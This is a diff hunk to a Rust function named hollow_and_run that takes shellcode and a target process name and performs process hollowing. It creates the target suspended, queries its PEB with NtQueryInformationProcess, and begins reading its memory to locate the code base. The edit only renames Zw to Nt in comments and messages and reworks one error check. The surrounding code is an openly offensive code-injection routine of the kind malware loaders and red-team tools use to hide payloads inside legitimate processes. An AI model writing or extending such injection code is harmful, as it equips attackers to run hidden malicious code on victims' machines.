@@ -41,12 +41,12 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         panic!("Could not create the suspended {target_process} with CreateProcessA");
     }
 
-    // Get the PEB base address of the suspended process with ZwQueryInformationProcess
+    // Get the PEB base address of the suspended process with NtQueryInformationProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
     let process_handle = process_information.hProcess;
     let mut basic_information = PROCESS_BASIC_INFORMATION::default();
-    if let Err(error) = unsafe {
+    if unsafe {
         NtQueryInformationProcess(
             process_handle,
             PROCESSINFOCLASS::default(),
@@ -54,8 +54,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             POINTER_SIZE_TIMES_SIX,
             &mut 0_u32,
         )
-    } {
-        panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
+    }.is_err() {
+        panic!("Could not get the entry point with NtQueryInformationProcess");
     }
 
     // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
